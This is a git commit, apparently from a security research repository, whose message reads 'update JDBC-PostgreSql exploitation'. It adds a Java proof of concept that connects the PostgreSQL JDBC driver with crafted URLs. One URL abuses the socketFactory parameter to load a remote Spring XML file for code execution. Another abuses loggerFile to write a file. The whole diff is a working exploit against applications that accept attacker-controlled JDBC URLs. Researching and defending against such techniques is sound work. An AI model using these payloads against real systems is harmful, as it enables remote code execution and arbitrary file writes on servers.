48772cf5e6e059a4a49eb1a402a7fc09ac430bcd
1diot9 <2868944833@qq.com>
2025-09-30 13:26:30 +0800

    更新JDBC-PostgreSql利用

--- JDBC/PostgreSql/src/main/java/com/test/DirectConnect.java
+++ JDBC/PostgreSql/src/main/java/com/test/DirectConnect.java
@@ -1,4 +1,15 @@
 package com.test;
 
+import org.postgresql.Driver;
+
+import java.sql.SQLException;
+
 public class DirectConnect {
+    public static void main(String[] args) throws SQLException {
+        Driver driver = new Driver();
+        String url = "jdbc:postgresql://127.0.0.1:1111/test/?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=http://127.0.0.1:7777/1.xml";
+        String url1 = "jdbc:postgresql://127.0.0.1:7777/test/";
+        String url2 = "jdbc:postgresql://FileWrite/?loggerLevel=DEBUG&loggerFile=log.txt";
+        driver.connect(url, null);
+    }
 }
